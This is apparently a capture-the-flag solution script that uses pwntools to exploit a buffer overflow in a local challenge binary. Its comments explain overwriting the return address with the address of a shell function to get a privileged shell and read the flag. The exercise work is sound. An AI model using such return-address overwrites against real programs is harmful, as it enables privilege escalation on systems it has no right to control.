#!/usr/bin/env python3

from pwn import *

'''
We already have matched a and b but shell is not running
To run shell we need to overwrite return address it will point to the shell function
The address of return shell we can find from the assembly code and gdb
We can also find directly from pwntools, get program as ELF object and get address of 'get_shell'
```find and save
	p = ELF("/challenges/chal2")
	shell_adress = p.symbols['get_a_shell']
	print(repr(p32(shell_adress)))

	|\x88\x04\x08
```
To reach the return we need to fill additional bytes
Finding number of bytes we need to insert by bruteforce is okay practise, because it saves our time 
and we just need to test between 0-128

In end we can access the privilaged shell and just cat /challenges/flag2
'''

# from chal1
a = 'EFGH'
b = 'ABCD'

if __name__ == '__main__':
	p = process('/challenges/chal2')
	p.sendline('IAMOVERWRITINGBUFFER' + b + a + 'SOMEADDITION' + '|\x88\x04\x08')
	p.interactive()
